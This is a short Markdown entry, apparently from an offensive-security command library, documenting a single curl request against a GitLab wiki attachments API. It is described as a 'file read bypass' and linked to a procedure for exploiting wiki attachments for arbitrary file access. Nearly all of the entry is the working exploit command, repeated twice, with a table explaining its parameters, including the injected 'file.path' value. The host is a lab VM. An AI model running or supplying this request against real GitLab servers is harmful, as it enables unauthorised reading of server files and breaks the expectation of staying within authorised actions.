---
data: >-
  curl -g -XPOST -v -H "Authorization: Bearer $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg'
  -F '[file]=@/tmp/lala.txt'
tags:
  - http-post
  - bypass
type: command
executor: bash
platforms:
  - Linux
id: 2d3fe183-0090-412b-a4fb-cca2bfce4622
created_at: '2025-12-11T03:47:39.406Z'
updated_at: '2025-12-11T03:47:39.406Z'
verified: false
validated: true
submitted: true
---
# curl-post-wiki-attachment

## Command

```bash
curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'
```

## Description

Sends POST to wiki API for file read bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-g` | Disable globbing | Yes |
| `-XPOST` | POST method | Yes |
| `-H "Authorization: Bearer $TOKEN"` | Auth header | Yes |
| `-F '[file]=@/tmp/lala.txt'` | Form field | Yes |
| `file.path=/tmp/ggg` | Target path | Yes |

## Examples

### Basic Usage

```bash
curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'
```

## Expected Output

JSON with file details.

## Related
- [[procedures/Exploit-Wiki-Attachments-for-Arbitrary-File-Access]]
